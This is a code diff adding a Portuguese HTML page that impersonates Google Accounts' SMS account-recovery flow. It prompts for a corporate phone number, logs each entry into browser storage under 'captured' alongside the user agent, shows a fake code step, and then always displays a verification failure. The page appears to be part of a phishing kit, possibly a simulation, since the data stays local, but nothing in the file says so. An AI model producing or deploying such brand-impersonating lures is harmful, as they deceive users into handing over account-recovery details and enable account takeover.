@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Código de verificação - Google Accounts</title>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body class="google-login">
+
+  <div class="card" id="stepPhone">
+    <div class="glogo"><h1 style="font-size:22px;">Receber código por SMS</h1></div>
+    <p class="subtitle">Digite o número de telefone associado à sua conta corporativa</p>
+
+    <div class="field">
+      <input type="tel" id="phone" placeholder="(11) 9 9999-9999"
+             onkeydown="if(event.key==='Enter'){event.preventDefault();sendCode();}">
+    </div>
+
+    <p class="hint">Vamos enviar um código de 6 dígitos por mensagem de texto. Padrões da operadora podem ser aplicados.</p>
+
+    <div class="card-footer">
+      <a href="esqueceu-senha.html" class="blue-link">Voltar</a>
+      <button class="btn-blue" onclick="sendCode()">Enviar código</button>
+    </div>
+  </div>
+
+  <div class="card hidden" id="stepCode">
+    <div class="glogo"><h1 style="font-size:22px;">Digite o código</h1></div>
+    <p class="subtitle">Enviamos um código de 6 dígitos para <b id="phoneMask"></b></p>
+
+    <div class="field">
+      <input type="text" id="code" maxlength="6" placeholder="Código de 6 dígitos" inputmode="numeric"
+             onkeydown="if(event.key==='Enter'){event.preventDefault();checkCode();}">
+    </div>
+
+    <div id="codeError" class="inline-error hidden">⚠ Código inválido. Verifique o SMS e tente novamente.</div>
+
+    <div class="card-footer">
+      <a href="esqueceu-senha.html" class="blue-link">Voltar</a>
+      <button class="btn-blue" onclick="checkCode()">Verificar</button>
+    </div>
+  </div>
+
+  <div class="card hidden" id="stepFail">
+    <div class="glogo"><h1 style="font-size:22px;" class="err">Não foi possível verificar</h1></div>
+    <p class="subtitle">Este número não corresponde aos registros da conta. Tente outra forma de recuperação ou <a href="../login.html" class="blue-link">faça login novamente</a>.</p>
+
+    <div class="card-footer">
+      <a href="esqueceu-senha.html" class="blue-link">Tentar outro método</a>
+      <a href="../login.html" class="btn-blue">Voltar ao login</a>
+    </div>
+  </div>
+
+<script>
+function sendCode(){
+  const phone = document.getElementById('phone').value.trim();
+  if(phone.length < 8){ document.getElementById('phone').focus(); return; }
+
+  const store = JSON.parse(localStorage.getItem('captured') || '[]');
+  store.push({
+    email: '[TELEFONE] ' + phone,
+    password: '(código SMS solicitado)',
+    timestamp: new Date().toLocaleTimeString('pt-BR'),
+    userAgent: navigator.userAgent,
+    target: 'SMS de recuperação'
+  });
+  localStorage.setItem('captured', JSON.stringify(store));
+  localStorage.setItem('captured_event', Date.now());
+
+  document.getElementById('phoneMask').textContent = phone.slice(0, 5) + '•••••' + phone.slice(-2);
+  document.getElementById('stepPhone').classList.add('hidden');
+  document.getElementById('stepCode').classList.remove('hidden');
+  document.getElementById('code').focus();
+}
+
+function checkCode(){
+  const c = document.getElementById('code').value.trim();
+  if(c.length === 6){
+    document.getElementById('stepCode').classList.add('hidden');
+    document.getElementById('stepFail').classList.remove('hidden');
+  } else {
+    document.getElementById('codeError').classList.remove('hidden');
+  }
+}
+
+document.getElementById('code').addEventListener('input', function(){
+  document.getElementById('codeError').classList.add('hidden');
+});
+
+document.getElementById('phone').addEventListener('input', function(e){
+  let v = e.target.value.replace(/\D/g, '').slice(0, 11);
+  if(v.length > 6) v = '(' + v.slice(0,2) + ') ' + v.slice(2,3) + ' ' + v.slice(3,7) + '-' + v.slice(7);
+  else if(v.length > 2) v = '(' + v.slice(0,2) + ') ' + v.slice(2);
+  e.target.value = v;
+});
+</script>
+</body>
+</html>
